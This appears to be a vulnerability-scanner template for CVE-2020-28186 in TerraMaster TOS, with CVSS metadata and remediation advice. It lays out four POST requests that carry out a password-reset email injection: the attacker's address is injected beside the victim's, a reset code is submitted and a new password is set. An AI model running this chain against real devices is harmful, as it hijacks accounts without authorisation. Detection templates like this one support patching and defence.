id: CVE-2020-28186

info:
  name: TerraMaster TOS Account Takeover via Email Injection
  author: ProjectDiscoveryAI
  severity: high
  description: Email Injection in TerraMaster TOS <= 4.2.06 allows remote unauthenticated attackers to abuse the forget password functionality and achieve account takeover.
  impact: |
    Successful exploitation could lead to unauthorized access to user accounts.
  remediation: |
    Update TerraMaster TOS to the latest version to mitigate the vulnerability.
  reference:
    - https://github.com/d4n-sec/d4n-sec.github.io
    - https://github.com/0day404/vulnerability-poc
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ArrestX/--POC
    - https://github.com/KayCHENvip/vulnerability-poc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2020-28186
    cwe-id: CWE-640
    epss-score: 0.00297
    epss-percentile: 0.70087
    cpe: cpe:2.3:o:terra-master:tos:*:*:*:*:*:*:*:*
  metadata:
    vendor: terra-master
    product: tos
    fofa-query: '"TerraMaster" && header="TOS"'

http:
  - method: POST
    path:
      - "{{BaseURL}}/wizard/initialise.php"

    body: "tab=checkuser&username=testaccount"
    matchers:
      - type: word
        words:
          - '"status":1'
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wizard/initialise.php"

    body: "tab=validmail&email=<valid_user@email>,<attacker_controlled@email>"
    matchers:
      - type: word
        words:
          - '"status":1'
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wizard/initialise.php"

    body: "tab=checkcode&code=FrSkzI"
    matchers:
      - type: word
        words:
          - '"status":1'
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wizard/initialise.php"

    body: "tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3"
    matchers:
      - type: word
        words:
          - '"status":1'
        part: body
